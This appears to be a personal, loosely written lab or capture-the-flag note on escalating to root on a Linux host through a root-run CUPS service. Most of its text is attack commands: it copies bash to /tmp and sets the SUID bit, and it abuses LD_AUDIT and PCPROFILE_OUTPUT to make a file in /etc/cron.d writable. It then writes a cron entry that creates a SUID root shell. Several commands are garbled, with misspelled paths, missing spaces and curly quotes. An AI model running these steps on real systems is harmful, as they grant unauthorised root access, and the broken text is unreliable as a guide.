Enum 
there is service running as root called CUPS;
the rce exploit: 

https://www.exploit-db.com/exploits/41233


put a bash binary in tmp folder and attempt to change SUID bit and then run the -p flag though the rce:
cp  /bin/bash /tmp/exploit;chmod+s /tmp/exploit /tmp/exploit -p 


The exploit required a .so file
Here is the reference:

https://cheatsheet.haax.fr/linux-systems/privilege-escalation/crontab/#writable-cron-directory

# In /tmp 
# LD_AUDIT="libpcprofile.so" PCPROFILE_OUTPUT="/etc/cron.d/exploit" ping
# since it won't find the .so, the file from PCPROFILE_OUTPUT will be written as word writeable
# Then insert payload inside to create suid root program in /tmp
printf “***** root cp /bin/dash /tmp/exploit; chmod u+s /tmp/exmploit\n” > /etc/cron.d/exploit
cat /etc/cron.d/exploit
ll
./exploit
whoami

This is an alternative way if we dont hAve .so file as per exploit requirements

and the your are root#
“””””””””””””””””””””””

Note:

I got this way for the requirement of this exploit we need to perform the bash suid thing first.
